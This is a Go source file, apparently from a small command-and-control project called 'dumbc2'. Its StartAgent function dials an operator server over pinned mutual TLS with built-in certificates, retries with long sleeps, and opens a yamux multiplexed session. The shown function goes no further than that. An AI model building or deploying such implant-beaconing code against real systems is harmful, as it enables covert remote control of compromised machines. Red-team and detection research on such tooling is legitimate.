package useri

import (
	"bytes"
	"encoding/base64"
	"github.com/kmahyyg/dumbc2/buildtime"
	"github.com/kmahyyg/dumbc2/config"
	"github.com/kmahyyg/dumbc2/remoteop"
	"github.com/kmahyyg/dumbc2/transport"
	"github.com/hashicorp/yamux"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"time"
)

func StartAgent(userOP *config.UserOperation) {
	servFGP := make([]byte, base64.StdEncoding.DecodedLen(len(buildtime.RemoteFingerprint)))
	_, err := base64.StdEncoding.Decode(servFGP, buildtime.RemoteFingerprint)
	if err != nil {
		log.Fatalln("Server Pinned Key Error.")
	}
	var errCounter = 0
	var buf bytes.Buffer
	var curConn net.Conn
	for {
		if errCounter >= 3 {
			return
		}
		curConn, err = transport.TLSDialer(servFGP, buildtime.ClientCertificatePEM, buildtime.ClientCertificateKey, buildtime.CACertificate, userOP.ListenAddr)
		if err != nil {
			errCounter++
			log.Println(err)
			time.Sleep(5 * time.Minute)
		} else {
			break
		}
	}
	ymconf := yamux.Config{
		AcceptBacklog:          256,
		EnableKeepAlive:        true,
		KeepAliveInterval:      time.Second * 20,
		ConnectionWriteTimeout: time.Minute * 5,
		MaxStreamWindowSize:    256 * 1024,
		LogOutput:              os.Stderr,
	}
	ymcli, err := yamux.Client(curConn, &ymconf)
	if err != nil {
		log.Fatalln(err)
	}
	errCounter = 0
	defer func() {
		_ = ymcli.Close()
		_ = curConn.Close()
	}()
}
